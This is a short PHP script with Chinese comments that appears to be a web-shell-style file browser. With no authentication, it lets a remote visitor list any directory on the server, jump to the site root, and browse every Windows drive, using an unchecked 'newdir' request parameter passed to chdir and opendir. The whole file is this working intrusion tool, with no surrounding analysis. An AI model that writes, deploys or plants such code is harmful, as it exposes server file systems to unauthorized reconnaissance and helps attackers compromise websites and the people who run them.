<?
error_reporting(1);
//列目录函数
function dirlist($cd){
        $dh = opendir($cd);
        while($dl = readdir($dh)){
                $dla[] = $dl;
        }
        foreach($dla as $d){
                if(!is_file($cd.$d)&&$d!="."){
                        $content.="<a href='?newdir=".$cd.$d."'>".$d."</a>"."<br />";
                }
        }
        foreach($dla as $d){
                if(is_file($cd.$d)){
                        $content.=$d."<br />";
                }
        }
        return $content;
}
//列出盘符函数
function listDisk(){
        $letters = range('b','z');
        foreach($letters as $l){
                if(is_dir($l.":")){
                        $dlist.= "[<a href='?newdir=".$l.":'>".$l."盘</a>]";
                }
        }
        echo $dlist;
}
//常量定义
$rd = $_SERVER['DOCUMENT_ROOT'];
$fd = $rd.substr($_SERVER['PHP_SELF'],0,strrpos($_SERVER['PHP_SELF'],"/"));
        
        if(!isset($_REQUEST['action'])){
                $ac = "dirlist";
        }else{
                $ac = $_REQUEST['action'];
        }
        if(!isset($_REQUEST['newdir'])){
                $cd = getcwd()."\\";
        }else{
                $cd = $_REQUEST['newdir']."\\";
                chdir($cd);
                $cd = getcwd()."\\";
        }
        switch($ac){
                case "dirlist":$content = dirlist($cd);break;
        }
?>
<html>
<style>
body{
        background-color:#000000;
        color:#FFFFFF;
}
a{
        color:#CC9900;
}
</style>
<body>
<div id="main">
    <div>
    <form name="form1" method="get" action="">
      <label>
      <input name="newdir" type="text" value="<?=$cd?>" size="60">
      </label>
      <label>
      <input type="submit" value="提交">
      </label>
    </form>
    </div>
    <hr color="#FFFFFF" />
  <div id="gongneng">文件目录：[<a href="?newdir=<?=$rd?>">站点根目录</a>][<a href="?newdir=<?=$fd?>">本文件目录</a>]<? listDisk(); ?></div>
        <hr color="#FFFFFF" />
    <div><?=$content?></div>
</div>
</body>
</html>